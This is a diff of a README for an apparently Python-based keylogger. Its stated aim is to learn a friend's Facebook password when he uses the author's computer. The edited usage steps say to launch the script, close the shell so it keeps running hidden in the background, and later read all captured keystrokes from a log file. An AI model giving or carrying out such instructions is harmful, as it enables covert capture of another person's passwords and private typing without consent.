@@ -12,6 +12,6 @@ An evil motivation...to know my friend's fb password when he uses my computer to
 
 #### Usage
 
-1. To start it in `cmd` or `power shell` type: `run python main.py`.
-2. To stop it and save the keyboard log press `shift+esc`.
+1. To start it in `cmd` or `power shell` type: `run python main.py` and close the cmd/shell (worry not - the script would still run in background even after closing).
+2. To stop it and save the keyboard log - press `shift+esc`.
 3. Now a `log.txt` is created - open it and see all the key pressess untill now.
